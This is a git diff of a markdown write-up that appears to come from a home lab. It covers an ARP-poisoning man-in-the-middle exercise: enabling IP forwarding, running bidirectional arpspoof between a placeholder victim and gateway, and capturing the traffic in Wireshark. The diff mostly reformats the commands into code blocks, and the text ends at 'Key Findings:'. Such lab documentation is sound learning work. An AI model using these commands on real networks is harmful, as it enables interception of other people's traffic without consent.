@@ -1,7 +1,6 @@
 
 **The Goal:** Show you can intercept and analyze real-world traffic.
 
-```markdown
 # Day 02: Man-in-the-Middle (MitM) via ARP Poisoning
 
 ##  Objective
@@ -11,17 +10,27 @@ To intercept and analyze traffic between a target host (Ubuntu) and the Gateway 
 
 ### 1. Enabling IP Forwarding
 To prevent a Denial of Service (DoS) on the victim, I enabled IPv4 forwarding on the Kali host:
+
 ```bash
 sudo sysctl -w net.ipv4.ip_forward=1
 
+```
 2. Executing the ARP Spoof
 Initiated a bi-directional attack to position Kali as the "Man-in-the-Middle":
 
-Terminal 1 (Victim): sudo arpspoof -i eth0 -t [Victim_IP] [Gateway_IP]
+Terminal 1 (Victim): 
+```bash
+sudo arpspoof -i eth0 -t [Victim_IP] [Gateway_IP]
 
-Terminal 2 (Gateway): sudo arpspoof -i eth0 -t [Gateway_IP] [Victim_IP]
+```
+Terminal 2 (Gateway):
+```bash
+sudo arpspoof -i eth0 -t [Gateway_IP] [Victim_IP]
 
+```
 3. Traffic Analysis (Wireshark)
+   ```bash
+   wireshark
 I monitored the eth0 interface and filtered for the victim's IP.
 
 Key Findings:
